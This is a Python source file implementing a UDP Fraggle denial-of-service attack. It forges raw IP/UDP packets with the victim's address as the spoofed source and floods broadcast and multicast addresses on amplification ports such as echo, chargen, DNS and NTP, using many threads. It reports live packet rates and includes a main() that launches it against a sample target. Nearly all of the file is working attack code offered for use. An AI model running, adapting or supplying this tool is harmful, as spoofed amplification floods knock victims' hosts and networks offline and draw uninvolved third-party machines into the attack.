import os
import sys
import struct
import socket
import threading
import time
import random

current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

try:
    from attack_strategy import AttackStrategy
except ImportError:
    from .attack_strategy import AttackStrategy


class UDPFraggle(AttackStrategy):
    """
    Concrete implementation of the AttackStrategy for UDP Fraggle attacks.

    UDP Fraggle is a network amplification attack that exploits the UDP protocol
    by sending UDP packets to broadcast addresses with spoofed source IP addresses.
    This causes all devices on the broadcast network to respond to the target,
    amplifying the attack traffic.

    The attack works by:
    1. Crafting UDP packets with spoofed source IP (victim's IP)
    2. Sending these packets to broadcast addresses
    3. All devices on the broadcast network respond to the spoofed source IP
    4. This creates amplified traffic directed at the victim
    """

    def __init__(
        self, target_ip, target_port=7, duration=60, threads=50, broadcast_networks=None
    ):
        """
        Initialize UDP Fraggle attack parameters.

        Args:
            target_ip (str): The IP address of the target (victim)
            target_port (int): The port to target (default: 7 for echo service)
            duration (int): Duration of the attack in seconds (default: 60)
            threads (int): Number of threads to use for the attack (default: 50)
            broadcast_networks (list): List of broadcast addresses to use for amplification
        """
        super().__init__(target_ip, target_port, duration, threads)

        self.broadcast_networks = broadcast_networks or [
            "192.168.1.255",
            "192.168.0.255",
            "10.0.0.255",
            "172.16.0.255",
            "224.0.0.1",  # All systems multicast
        ]

        # Common UDP services for amplification
        self.target_services = [
            7,   # Echo
            13,  # Daytime
            19,  # CharGen
            37,  # Time
            53,  # DNS
            123, # NTP
            161, # SNMP
            137, # NetBIOS Name Service
            138, # NetBIOS Datagram Service
        ]

    def _create_ip_header(self, source_ip, dest_ip):
        """
        Create IP header for UDP packet with spoofed source IP.

        IP Header Structure (RFC 791):
        0                   1                   2                   3
        0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |Version|  IHL  |Type of Service|          Total Length         |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |         Identification        |Flags|      Fragment Offset    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |  Time to Live |    Protocol   |         Header Checksum       |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                       Source Address                          |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                    Destination Address                        |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                    Options                    |    Padding    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        """
        version = 4
        ihl = 5
        type_of_service = 0
        total_length = 28
        identification = random.randint(1, 65535)
        flags = 0
        fragment_offset = 0
        ttl = 64
        protocol = socket.IPPROTO_UDP
        checksum = 0

        source_addr = socket.inet_aton(source_ip)
        dest_addr = socket.inet_aton(dest_ip)

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (version << 4) + ihl,
            type_of_service,
            total_length,
            identification,
            (flags << 13) + fragment_offset,
            ttl,
            protocol,
            checksum,
            source_addr,
            dest_addr,
        )

        checksum = self.checksum(ip_header)

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (version << 4) + ihl,
            type_of_service,
            total_length,
            identification,
            (flags << 13) + fragment_offset,
            ttl,
            protocol,
            checksum,
            source_addr,
            dest_addr,
        )

        return ip_header

    def _create_udp_header(self, source_ip, dest_ip, source_port, dest_port, data):
        """
        Create UDP header with checksum.

        UDP Header Structure (RFC 768):
        0      7 8     15 16    23 24    31
        +--------+--------+--------+--------+
        |     Source      |   Destination   |
        |      Port       |      Port       |
        +--------+--------+--------+--------+
        |                 |                 |
        |     Length      |    Checksum     |
        +--------+--------+--------+--------+
        |
        |          data octets ...
        +---------------- ...
        """
        udp_length = 8 + len(data)  # UDP header (8) + data length
        checksum = 0  # Will be calculated later

        # Pack UDP header (without checksum)
        udp_header = struct.pack("!HHHH", source_port, dest_port, udp_length, checksum)

        source_addr = socket.inet_aton(source_ip)
        dest_addr = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_UDP

        pseudo_header = struct.pack(
            "!4s4sBBH", source_addr, dest_addr, placeholder, protocol, udp_length
        )
        pseudo_packet = pseudo_header + udp_header + data

        checksum = self.checksum(pseudo_packet)

        udp_header = struct.pack("!HHHH", source_port, dest_port, udp_length, checksum)

        return udp_header

    def _send_fraggle_packet(self, broadcast_ip, service_port):
        """
        Send a single UDP Fraggle packet to a broadcast address.

        Args:
            broadcast_ip (str): The broadcast IP address to send to
            service_port (int): The target service port
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            spoofed_ip = self.target_ip
            payload = b"FRAGGLE_ATTACK_PAYLOAD"

            ip_header = self._create_ip_header(spoofed_ip, broadcast_ip)
            udp_header = self._create_udp_header(
                spoofed_ip,
                broadcast_ip,
                random.randint(1024, 65535),
                service_port,
                payload,
            )

            packet = ip_header + udp_header + payload
            sock.sendto(packet, (broadcast_ip, service_port))
            sock.close()

            self.packets_sent += 1

            self.logger.debug(
                f"Sent Fraggle packet: {spoofed_ip} -> {broadcast_ip}:{service_port}"
            )

        except Exception as e:
            self.logger.error(
                f"Error sending Fraggle packet to {broadcast_ip}:{service_port}: {e}"
            )

    def _fraggle_worker(self, thread_id):
        """
        Worker thread for continuous UDP Fraggle packet sending.

        Args:
            thread_id (int): Thread identifier
        """
        self.logger.info(f"Fraggle worker thread {thread_id} started")

        while self.attack_active:
            try:
                broadcast_ip = random.choice(self.broadcast_networks)
                service_port = random.choice(self.target_services)

                self._send_fraggle_packet(broadcast_ip, service_port)
                time.sleep(0.001)

            except Exception as e:
                self.logger.error(f"Error in Fraggle worker thread {thread_id}: {e}")
                time.sleep(0.1)

        self.logger.info(f"Fraggle worker thread {thread_id} stopped")

    def attack(self):
        """
        Execute the UDP Fraggle attack.

        This method orchestrates the entire attack by:
        1. Checking for raw socket privileges
        2. Starting multiple worker threads
        3. Monitoring attack progress
        4. Displaying real-time statistics
        """
        if not self._check_raw_socket_privileges(socket.IPPROTO_UDP):
            return

        self._display_attack_header()

        self._print_info(f"Broadcast networks: {len(self.broadcast_networks)}")
        self._print_info(f"Target services: {len(self.target_services)}")
        self._print_warning(
            "⚠ This attack uses IP spoofing and broadcast amplification"
        )

        self.logger.info("UDP Fraggle attack initiated")
        self.logger.info(f"Target: {self.target_ip}:{self.target_port}")
        self.logger.info(f"Broadcast networks: {self.broadcast_networks}")
        self.logger.info(f"Target services: {self.target_services}")

        self.attack_active = True
        start_time = time.time()

        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=self._fraggle_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        self._print_success(f"✓ Started {len(threads)} attack threads")

        try:
            last_count = 0
            while time.time() - start_time < self.duration:
                time.sleep(1)

                current_count = self.packets_sent
                rate = current_count - last_count
                last_count = current_count

                elapsed = time.time() - start_time
                remaining = self.duration - elapsed

                rate_color = self._get_rate_color(rate)
                self._print_colored(
                    f"[{elapsed:6.1f}s] Packets: {current_count:6d} | Rate: {rate:4d} pps | "
                    f"Remaining: {remaining:5.1f}s",
                    rate_color,
                )

                if current_count % 1000 == 0:
                    self.logger.info(
                        f"Progress: {current_count} packets sent, {rate} pps"
                    )

        except KeyboardInterrupt:
            self._print_warning("\n⚠ Attack interrupted by user")
            self.logger.warning("Attack interrupted by user")

        finally:
            self.attack_active = False
            self._print_info("Stopping attack threads...")

            for thread in threads:
                thread.join(timeout=1.0)

            self._display_attack_completion(start_time)


def main():
    """
    Main function to run the UDP Fraggle attack.
    """
    # Example usage
    target_ip = "192.168.1.100"  # Target IP (victim)
    target_port = 7  # Echo service port
    duration = 30  # 30 seconds
    threads = 20  # 20 threads

    # Custom broadcast networks (optional)
    broadcast_networks = ["192.168.1.255", "10.0.0.255", "172.16.0.255"]

    attack = UDPFraggle(target_ip, target_port, duration, threads, broadcast_networks)
    attack.attack()


if __name__ == "__main__":
    main()
